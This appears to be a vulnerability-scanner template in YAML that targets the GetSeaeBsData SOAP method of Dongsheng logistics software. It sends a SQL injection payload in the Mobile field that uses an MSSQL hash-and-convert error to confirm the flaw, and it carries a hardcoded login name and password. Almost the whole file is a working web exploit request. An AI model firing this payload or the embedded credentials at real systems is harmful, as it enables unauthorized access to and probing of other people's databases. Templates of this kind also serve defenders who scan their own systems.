folder-5/poc-yaml-dongshengsoft-getseaebsdata-sqli.yaml

id: poc-yaml-dongshengsoft-getseaebsdata-sqli
info:
  name: 东胜物流软件 GetSeaeBsData SQL注入漏洞
  author: ProjectDiscoveryAI
  severity: high
  tags: sqli
  description: |
    东胜物流软件的 GetSeaeBsData 方法存在 SQL 注入漏洞，攻击者可以利用该漏洞执行任意 SQL 查询。

variables:
  t1: "{{rand_int(1000, 10000)}}"
  t2: "{{md5(t1)}}"

http:
  - method: POST
    path:
      - "/Webservice/DsWebService.asmx"
    headers:
      Content-Type: "application/soap+xml;charset=UTF-8;action=\"DsWebService/GetSeaeBsData\""
    body: |-
      <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
         <soap:Header/>
         <soap:Body>
            <dsw:GetSeaeBsData>
               <!--Optional:-->
               <dsw:LoginName>qdtaize</dsw:LoginName>
               <!--Optional:-->
               <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
               <!--Optional:-->
               <dsw:Mobile>1')or 1&lt;sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--</dsw:Mobile>
               <!--Optional:-->
               <dsw:Mblno>1</dsw:Mblno>
               <dsw:start>1</dsw:start>
               <dsw:limit>1</dsw:limit>
            </dsw:GetSeaeBsData>
         </soap:Body>
      </soap:Envelope>
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 500
      - type: word
        words:
          - "{{t2}}"
          - "GetSeaeBsData"
      - type: regex
        regex:
          - "转换成数据类型(.*?)时失败"
          - "在将(.*?)值"
      - type: word
        part: header
        words:
          - "application/soap+xml"
